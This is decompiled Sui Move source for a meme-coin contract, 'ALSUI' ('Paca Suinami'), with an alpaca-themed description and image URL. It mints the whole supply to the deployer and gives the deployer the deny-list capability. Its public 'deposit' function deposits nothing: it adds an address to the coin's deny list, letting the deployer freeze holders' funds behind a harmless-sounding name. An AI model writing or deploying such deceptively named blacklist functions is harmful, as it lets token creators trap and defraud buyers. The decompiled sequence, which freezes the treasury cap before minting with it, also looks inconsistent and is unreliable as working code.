module 0xc83ef77ec830e34e2dd3fdb250539bbc0e9ac2ea61409ad4999f0ef8de8672a7::alsui {
    struct ALSUI has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ALSUI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ALSUI>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: ALSUI, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2Funmadesugar_a_alpaca_in_the_sea_in_a_snorkel_28697ac3_fc61_43b1_8046_01c0595a6369_5bc67ec92e.jpg&w=640&q=75                                                                                                                                     ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<ALSUI>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"ALSUI   ")))), trim_right(b"Paca Suinami                    "), trim_right(b"Al the Alpaca is diving headfirst into the crypto world as the newest face of SUI meme coins. With his flippers steering towards making an upcoming                                                                                                                                                                             "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ALSUI>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ALSUI>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<ALSUI>>(0x2::coin::mint<ALSUI>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ALSUI>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

